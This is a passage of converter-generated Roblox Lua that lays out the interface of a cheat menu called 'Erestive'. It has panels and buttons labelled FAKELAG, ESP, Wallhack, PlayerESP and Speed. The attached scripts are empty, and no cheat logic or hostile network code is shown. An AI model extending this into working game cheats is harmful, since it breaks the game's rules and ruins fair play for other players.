G2L["3e5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e5"]["BackgroundTransparency"] = 1;
G2L["3e5"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.FL.FOV.TextButton
G2L["3e6"] = Instance.new("TextButton", G2L["3e0"]);
G2L["3e6"]["TextWrapped"] = true;
G2L["3e6"]["BorderSizePixel"] = 0;
G2L["3e6"]["TextSize"] = 14;
G2L["3e6"]["TextScaled"] = true;
G2L["3e6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3e6"]["BackgroundTransparency"] = 1;
G2L["3e6"]["Size"] = UDim2.new(0, 89, 0, 34);
G2L["3e6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e6"]["Text"] = [[-]];
G2L["3e6"]["Position"] = UDim2.new(0.44874, 0, 0.14243, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.FL.FOV.TextButton.LocalScript
G2L["3e7"] = Instance.new("LocalScript", G2L["3e6"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame4.FL.FOV.TextButton.TextLabel
G2L["3e8"] = Instance.new("TextLabel", G2L["3e6"]);
G2L["3e8"]["TextWrapped"] = true;
G2L["3e8"]["BorderSizePixel"] = 0;
G2L["3e8"]["TextSize"] = 1;
G2L["3e8"]["TextScaled"] = true;
G2L["3e8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3e8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e8"]["BackgroundTransparency"] = 1;
G2L["3e8"]["Size"] = UDim2.new(1, 0, 0.49763, 0);
G2L["3e8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e8"]["Text"] = [[FAKELAG]];
G2L["3e8"]["Position"] = UDim2.new(0, 0, -0.185, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6
G2L["3e9"] = Instance.new("ScrollingFrame", G2L["a6"]);
G2L["3e9"]["Visible"] = false;
G2L["3e9"]["Active"] = true;
G2L["3e9"]["ZIndex"] = 3;
G2L["3e9"]["BorderSizePixel"] = 0;
G2L["3e9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e9"]["Name"] = [[Frame6]];
G2L["3e9"]["ScrollBarImageTransparency"] = 1;
G2L["3e9"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["3e9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3e9"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e9"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["3e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e9"]["ScrollBarThickness"] = 0;
G2L["3e9"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.UIPadding
G2L["3ea"] = Instance.new("UIPadding", G2L["3e9"]);
G2L["3ea"]["PaddingTop"] = UDim.new(0, 5);
G2L["3ea"]["PaddingRight"] = UDim.new(0, 5);
G2L["3ea"]["PaddingLeft"] = UDim.new(0, 1);
G2L["3ea"]["PaddingBottom"] = UDim.new(0, 1);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time
G2L["3eb"] = Instance.new("Frame", G2L["3e9"]);
G2L["3eb"]["BorderSizePixel"] = 0;
G2L["3eb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3eb"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["3eb"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["3eb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3eb"]["Name"] = [[Time]];
G2L["3eb"]["LayoutOrder"] = 4;
G2L["3eb"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.UIListLayout
G2L["3ec"] = Instance.new("UIListLayout", G2L["3eb"]);
G2L["3ec"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV
G2L["3ed"] = Instance.new("Frame", G2L["3eb"]);
G2L["3ed"]["BorderSizePixel"] = 0;
G2L["3ed"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["3ed"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3ed"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["3ed"]["Name"] = [[FOV]];
G2L["3ed"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.Text
G2L["3ee"] = Instance.new("TextLabel", G2L["3ed"]);
G2L["3ee"]["TextWrapped"] = true;
G2L["3ee"]["ZIndex"] = 9;
G2L["3ee"]["TextSize"] = 14;
G2L["3ee"]["TextScaled"] = true;
G2L["3ee"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3ee"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3ee"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3ee"]["BackgroundTransparency"] = 1;
G2L["3ee"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["3ee"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3ee"]["Text"] = [[Time]];
G2L["3ee"]["Name"] = [[Text]];
G2L["3ee"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.WhiteBar
G2L["3ef"] = Instance.new("Frame", G2L["3ed"]);
G2L["3ef"]["BorderSizePixel"] = 0;
G2L["3ef"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3ef"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["3ef"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["3ef"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3ef"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.WhiteBar.UIGradient
G2L["3f0"] = Instance.new("UIGradient", G2L["3ef"]);
G2L["3f0"]["Rotation"] = 90;
G2L["3f0"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.UICorner
G2L["3f1"] = Instance.new("UICorner", G2L["3ed"]);
G2L["3f1"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig
G2L["3f2"] = Instance.new("Frame", G2L["3ed"]);
G2L["3f2"]["BorderSizePixel"] = 0;
G2L["3f2"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["3f2"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["3f2"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["3f2"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.UICorner
G2L["3f3"] = Instance.new("UICorner", G2L["3f2"]);
G2L["3f3"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.FOVSet
G2L["3f4"] = Instance.new("TextBox", G2L["3f2"]);
G2L["3f4"]["Name"] = [[FOVSet]];
G2L["3f4"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["3f4"]["TextWrapped"] = true;
G2L["3f4"]["TextSize"] = 14;
G2L["3f4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f4"]["TextScaled"] = true;
G2L["3f4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["3f4"]["ClearTextOnFocus"] = false;
G2L["3f4"]["PlaceholderText"] = [[14:30:00 - classic]];
G2L["3f4"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3f4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3f4"]["Text"] = [[14:30:00]];
G2L["3f4"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.SetFOV
G2L["3f5"] = Instance.new("Frame", G2L["3f2"]);
G2L["3f5"]["ZIndex"] = 2;
G2L["3f5"]["BorderSizePixel"] = 0;
G2L["3f5"]["BackgroundColor3"] = Color3.fromRGB(43, 0, 0);
G2L["3f5"]["Size"] = UDim2.new(1.68032, 0, 0.55875, 0);
G2L["3f5"]["Position"] = UDim2.new(-0.76654, 0, 1.1181, 0);
G2L["3f5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3f5"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.SetFOV.Animations
G2L["3f6"] = Instance.new("LocalScript", G2L["3f5"]);
G2L["3f6"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["3f7"] = Instance.new("ImageLabel", G2L["3f6"]);
G2L["3f7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f7"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3f7"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["3f7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3f7"]["BackgroundTransparency"] = 1;
G2L["3f7"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.SetFOV.UICorner
G2L["3f8"] = Instance.new("UICorner", G2L["3f5"]);
G2L["3f8"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.SetFOV.Button
G2L["3f9"] = Instance.new("TextButton", G2L["3f5"]);
G2L["3f9"]["TextWrapped"] = true;
G2L["3f9"]["TextSize"] = 14;
G2L["3f9"]["TextScaled"] = true;
G2L["3f9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["3f9"]["BackgroundTransparency"] = 1;
G2L["3f9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3f9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3f9"]["Text"] = [[ ]];
G2L["3f9"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.SetFOV.Button.LocalScript
G2L["3fa"] = Instance.new("LocalScript", G2L["3f9"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.SetFOV.Button.Animations
G2L["3fb"] = Instance.new("LocalScript", G2L["3f9"]);
G2L["3fb"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.SetFOV.Text
G2L["3fc"] = Instance.new("TextLabel", G2L["3f5"]);
G2L["3fc"]["TextWrapped"] = true;
G2L["3fc"]["ZIndex"] = 9;
G2L["3fc"]["TextSize"] = 14;
G2L["3fc"]["TextScaled"] = true;
G2L["3fc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3fc"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["3fc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3fc"]["BackgroundTransparency"] = 1;
G2L["3fc"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3fc"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3fc"]["Text"] = [[ENABLE]];
G2L["3fc"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.FOVConfig.SetFOV.UIGradient
G2L["3fd"] = Instance.new("UIGradient", G2L["3f5"]);
G2L["3fd"]["Rotation"] = -90;
G2L["3fd"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Time.FOV.UIGradient
G2L["3fe"] = Instance.new("UIGradient", G2L["3ed"]);
G2L["3fe"]["Rotation"] = -90;
G2L["3fe"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2
G2L["3ff"] = Instance.new("Frame", G2L["3e9"]);
G2L["3ff"]["ZIndex"] = 3;
G2L["3ff"]["BorderSizePixel"] = 0;
G2L["3ff"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3ff"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["3ff"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["3ff"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3ff"]["Name"] = [[Speed2]];
G2L["3ff"]["LayoutOrder"] = 1;
G2L["3ff"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.UIListLayout
G2L["400"] = Instance.new("UIListLayout", G2L["3ff"]);
G2L["400"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV
G2L["401"] = Instance.new("Frame", G2L["3ff"]);
G2L["401"]["BorderSizePixel"] = 0;
G2L["401"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["401"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["401"]["Name"] = [[FOV]];
G2L["401"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.UICorner
G2L["402"] = Instance.new("UICorner", G2L["401"]);
G2L["402"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig
G2L["403"] = Instance.new("Frame", G2L["401"]);
G2L["403"]["BorderSizePixel"] = 0;
G2L["403"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["403"]["Size"] = UDim2.new(0.57695, 0, 0.81331, 0);
G2L["403"]["Position"] = UDim2.new(0.39591, 0, 0.09064, 0);
G2L["403"]["Name"] = [[FOVConfig]];
G2L["403"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.UICorner
G2L["404"] = Instance.new("UICorner", G2L["403"]);
G2L["404"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.FOVSet
G2L["405"] = Instance.new("TextBox", G2L["403"]);
G2L["405"]["Visible"] = false;
G2L["405"]["Name"] = [[FOVSet]];
G2L["405"]["PlaceholderColor3"] = Color3.fromRGB(90, 169, 157);
G2L["405"]["TextWrapped"] = true;
G2L["405"]["TextSize"] = 14;
G2L["405"]["TextColor3"] = Color3.fromRGB(71, 255, 38);
G2L["405"]["TextScaled"] = true;
G2L["405"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["405"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["405"]["ClearTextOnFocus"] = false;
G2L["405"]["PlaceholderText"] = [[Dis]];
G2L["405"]["Size"] = UDim2.new(0, 33, 0, 33);
G2L["405"]["Position"] = UDim2.new(0.54158, 0, 0, 0);
G2L["405"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["405"]["Text"] = [[100]];
G2L["405"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.FOVSet.LocalScript
G2L["406"] = Instance.new("LocalScript", G2L["405"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV
G2L["407"] = Instance.new("Frame", G2L["403"]);
G2L["407"]["ZIndex"] = 2;
G2L["407"]["BorderSizePixel"] = 0;
G2L["407"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["407"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["407"]["Position"] = UDim2.new(-0.76654, 0, 1.31329, 0);
G2L["407"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["407"]["Name"] = [[SetFOV]];
G2L["407"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Animations
G2L["408"] = Instance.new("LocalScript", G2L["407"]);
G2L["408"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["409"] = Instance.new("ImageLabel", G2L["408"]);
G2L["409"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["409"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["409"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["409"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["409"]["BackgroundTransparency"] = 1;
G2L["409"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.UICorner
G2L["40a"] = Instance.new("UICorner", G2L["407"]);
G2L["40a"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button
G2L["40b"] = Instance.new("TextButton", G2L["407"]);
G2L["40b"]["TextWrapped"] = true;
G2L["40b"]["TextSize"] = 14;
G2L["40b"]["TextScaled"] = true;
G2L["40b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["40b"]["BackgroundTransparency"] = 1;
G2L["40b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["40b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["40b"]["Text"] = [[ ]];
G2L["40b"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button.Animations
G2L["40c"] = Instance.new("LocalScript", G2L["40b"]);
G2L["40c"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button.ColorChanger
G2L["40d"] = Instance.new("LocalScript", G2L["40b"]);
G2L["40d"]["Enabled"] = false;
G2L["40d"]["Name"] = [[ColorChanger]];
G2L["40d"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button.Wallhack
G2L["40e"] = Instance.new("LocalScript", G2L["40b"]);
G2L["40e"]["Name"] = [[Wallhack]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button.PlayerESP
G2L["40f"] = Instance.new("LocalScript", G2L["40b"]);
G2L["40f"]["Name"] = [[PlayerESP]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button.surfaceold
G2L["410"] = Instance.new("SurfaceGui", G2L["40b"]);
G2L["410"]["LightInfluence"] = 1;
G2L["410"]["AlwaysOnTop"] = true;
G2L["410"]["Name"] = [[surfaceold]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button.surfaceold.surfaceface
G2L["411"] = Instance.new("TextLabel", G2L["410"]);
G2L["411"]["TextStrokeTransparency"] = 2;
G2L["411"]["BorderSizePixel"] = 0;
G2L["411"]["TextSize"] = 14;
G2L["411"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["411"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["411"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["411"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["411"]["Text"] = [[]];
G2L["411"]["Name"] = [[surfaceface]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button.surface
G2L["412"] = Instance.new("SurfaceGui", G2L["40b"]);
G2L["412"]["Face"] = Enum.NormalId.Top;
G2L["412"]["LightInfluence"] = 1;
G2L["412"]["AlwaysOnTop"] = true;
G2L["412"]["Name"] = [[surface]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button.surface.surfaceface
G2L["413"] = Instance.new("TextLabel", G2L["412"]);
G2L["413"]["TextStrokeTransparency"] = 2;
G2L["413"]["BorderSizePixel"] = 0;
G2L["413"]["TextSize"] = 14;
G2L["413"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["413"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["413"]["BackgroundTransparency"] = 0.7;
G2L["413"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["413"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["413"]["Text"] = [[]];
G2L["413"]["Name"] = [[surfaceface]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Button.UIGradient
G2L["414"] = Instance.new("UIGradient", G2L["40b"]);
G2L["414"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 0, 0))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.Text
G2L["415"] = Instance.new("TextLabel", G2L["407"]);
G2L["415"]["TextWrapped"] = true;
G2L["415"]["ZIndex"] = 9;
G2L["415"]["TextSize"] = 14;
G2L["415"]["TextScaled"] = true;
G2L["415"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["415"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["415"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["415"]["BackgroundTransparency"] = 1;
G2L["415"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["415"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["415"]["Text"] = [[ESP]];
G2L["415"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.UIGradient
G2L["416"] = Instance.new("UIGradient", G2L["407"]);
G2L["416"]["Rotation"] = -90;
G2L["416"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.SetFOV.UIStroke
G2L["417"] = Instance.new("UIStroke", G2L["407"]);
G2L["417"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.UIListLayout
G2L["418"] = Instance.new("UIListLayout", G2L["403"]);
G2L["418"]["Padding"] = UDim.new(0, 10);
G2L["418"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.FOVConfig.FOVSet2
G2L["419"] = Instance.new("TextBox", G2L["403"]);
G2L["419"]["Visible"] = false;
G2L["419"]["Name"] = [[FOVSet2]];
G2L["419"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["419"]["TextWrapped"] = true;
G2L["419"]["TextSize"] = 14;
G2L["419"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["419"]["TextScaled"] = true;
G2L["419"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["419"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["419"]["ClearTextOnFocus"] = false;
G2L["419"]["PlaceholderText"] = [[Speed]];
G2L["419"]["Size"] = UDim2.new(0, 33, 0, 33);
G2L["419"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["419"]["Text"] = [[0.1]];
G2L["419"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.UIGradient
G2L["41a"] = Instance.new("UIGradient", G2L["401"]);
G2L["41a"]["Rotation"] = -90;
G2L["41a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.ImageLabel
G2L["41b"] = Instance.new("ImageLabel", G2L["401"]);
G2L["41b"]["BorderSizePixel"] = 0;
G2L["41b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["41b"]["Image"] = [[rbxassetid://120129574453255]];
G2L["41b"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["41b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41b"]["BackgroundTransparency"] = 1;
G2L["41b"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.WhiteBar
G2L["41c"] = Instance.new("Frame", G2L["401"]);
G2L["41c"]["Visible"] = false;
G2L["41c"]["BorderSizePixel"] = 0;
G2L["41c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41c"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["41c"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["41c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["41c"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.WhiteBar.UIGradient
G2L["41d"] = Instance.new("UIGradient", G2L["41c"]);
G2L["41d"]["Rotation"] = 90;
G2L["41d"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed2.FOV.UIStroke
G2L["41e"] = Instance.new("UIStroke", G2L["401"]);
G2L["41e"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed
G2L["41f"] = Instance.new("Frame", G2L["3e9"]);
G2L["41f"]["Visible"] = false;
G2L["41f"]["BorderSizePixel"] = 0;
G2L["41f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41f"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["41f"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["41f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41f"]["Name"] = [[Speed]];
G2L["41f"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.UIListLayout
G2L["420"] = Instance.new("UIListLayout", G2L["41f"]);
G2L["420"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame6.Speed.FOV
G2L["421"] = Instance.new("Frame", G2L["41f"]);
G2L["421"]["BorderSizePixel"] = 0;
G2L["421"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["421"]["Size"] = UDim2.new(1, 0, 1, 0);
